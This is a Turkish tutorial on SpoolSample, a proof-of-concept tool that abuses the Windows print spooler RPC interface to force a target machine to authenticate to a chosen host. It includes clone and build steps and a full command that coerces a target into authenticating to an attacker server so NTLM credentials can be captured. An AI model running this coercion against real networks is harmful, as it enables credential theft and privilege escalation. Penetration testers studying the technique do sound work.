# SpoolSample Kullanım Rehberi

## SpoolSample Nedir?

**SpoolSample**, Windows sistemlerinde MS-RPRN (Print System Remote Protocol) RPC arayüzü üzerinden bir hedef makineyi başka bir makineye kimlik doğrulaması yapmaya zorlayan bir Proof of Concept (PoC) aracıdır. Bu yöntem, özellikle güvenlik testlerinde kimlik bilgisi toplama ve yetki yükseltme senaryolarında kullanılır.

> **Önemli Not:** SpoolSample, yalnızca yetkili güvenlik testleri ve eğitim amaçlı kullanılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Gereksinimler

- **Hedef Sistem:** Windows işletim sistemi çalıştıran ve Print Spooler hizmeti etkin olan bir makine.
- **Saldırgan Sistemi:** SpoolSample aracının çalıştırılabileceği bir Windows makinesi.

---

## İndirme ve Kurulum

1. **Kaynak Kodun İndirilmesi:**
   ```bash
   git clone https://github.com/leechristensen/SpoolSample.git
   ```

2. **Derleme:**
   - Visual Studio kullanarak projeyi açın ve derleyin.
   - Derleme sonucunda `SpoolSample.exe` dosyasını elde edeceksiniz.

---

## Kullanım

SpoolSample, hedef makineyi saldırganın kontrolündeki bir sunucuya kimlik doğrulaması yapmaya zorlamak için kullanılır. Bu işlem, NTLM kimlik bilgilerini ele geçirmek veya diğer kimlik doğrulama saldırıları için kullanılabilir.

**Temel Kullanım:**
```bash
SpoolSample.exe \HedefMakine \SaldırganSunucu
```

**Parametreler:**
- `\HedefMakine`: Kimlik doğrulaması yapmaya zorlanacak hedef makinenin adı veya IP adresi.
- `\SaldırganSunucu`: Hedef makinenin kimlik doğrulaması yapacağı saldırganın kontrolündeki sunucunun adı veya IP adresi.

**Örnek Kullanım:**
```bash
SpoolSample.exe \192.168.1.10 \192.168.1.20
```
Bu komut, `192.168.1.10` IP adresine sahip hedef makineyi, `192.168.1.20` IP adresine sahip saldırgan sunucusuna kimlik doğrulaması yapmaya zorlar.

---

## Önemli Notlar

- **Print Spooler Hizmeti:** Hedef makinede Print Spooler hizmetinin etkin olması gerekmektedir.
- **Güvenlik Önlemleri:** Bu aracın kullanımı, ağınızın güvenlik politikalarına ve yasal düzenlemelere uygun olmalıdır.

---

## Kaynaklar

- [SpoolSample GitHub Deposu](https://github.com/leechristensen/SpoolSample)
- [MS-RPRN - Print System Remote Protocol](https://msdn.microsoft.com/en-us/library/cc244528.aspx)

---

> **Uyarı:** Bu rehber yalnızca eğitim ve yetkili güvenlik testleri için hazırlanmıştır. Yetkisiz kullanım durumunda yasal sorumluluklar doğabilir.
